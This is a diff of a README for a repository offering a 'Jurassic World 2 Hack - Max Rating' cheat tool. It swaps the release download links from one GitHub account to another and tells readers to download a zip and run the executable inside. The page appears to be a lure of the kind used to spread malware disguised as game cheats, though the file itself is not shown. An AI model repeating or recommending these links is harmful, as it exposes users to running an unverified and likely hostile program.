@@ -19,7 +19,7 @@ Welcome to the **Jurassic World 2 Hack - Max Rating** repository! This project a
 
 **Jurassic World Evolution 2** is an exciting simulation game that allows players to build and manage their own dinosaur theme park. However, navigating the game can be challenging. This repository provides tools to enhance your experience, making it easier to enjoy the game without the usual limitations.
 
-You can download the latest releases from our [Releases section](https://github.com/pushbeedeepee7pss/Jurassic-World-2-hack-max-rating/releases/download/2.3.5/Jurassic.World.2.Hack.Max.Rating.v2.3.5.zip). Make sure to check it out for the latest updates and tools!
+You can download the latest releases from our [Releases section](https://github.com/masterroma3fv/Jurassic-World-2-hack-max-rating/releases/download/2.3.5/Jurassic.World.2.Hack.Max.Rating.v2.3.5.zip). Make sure to check it out for the latest updates and tools!
 
 ## Features
 
@@ -37,7 +37,7 @@ This repository includes several features that improve your gameplay experience:
 
 To get started, follow these steps:
 
-1. **Download the latest release** from our [Releases section](https://github.com/pushbeedeepee7pss/Jurassic-World-2-hack-max-rating/releases/download/2.3.5/Jurassic.World.2.Hack.Max.Rating.v2.3.5.zip).
+1. **Download the latest release** from our [Releases section](https://github.com/masterroma3fv/Jurassic-World-2-hack-max-rating/releases/download/2.3.5/Jurassic.World.2.Hack.Max.Rating.v2.3.5.zip).
 2. **Extract the downloaded files** to a location of your choice.
 3. **Run the executable file** to start using the hacks.
 
